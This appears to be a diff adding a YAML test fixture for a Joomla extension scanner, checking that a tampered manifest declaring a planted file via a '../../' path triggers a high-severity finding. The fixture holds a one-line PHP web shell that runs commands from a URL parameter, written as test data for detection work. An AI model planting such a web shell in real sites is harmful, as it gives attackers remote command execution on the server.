@@ -1,0 +1,18 @@
+# Positivo (FR-132): manifiesto editado para declarar el archivo plantado en
+# ubicación anómala → J0W-EXT-004, no se acepta a ciegas.
+case: ext-manifest-tampered
+base:
+  cms: joomla
+  version: "1.1.0"
+expect:
+  exit_code: 1
+  findings:
+    - rule_id: J0W-EXT-004
+      min_severity: high
+mutations:
+  - op: add_extension
+  - op: undeclared_file
+    path: images/planted.php
+    content: "<?php system($_GET['c']); ?>"
+  - op: tamper_manifest
+    declare: "../../images/planted.php"
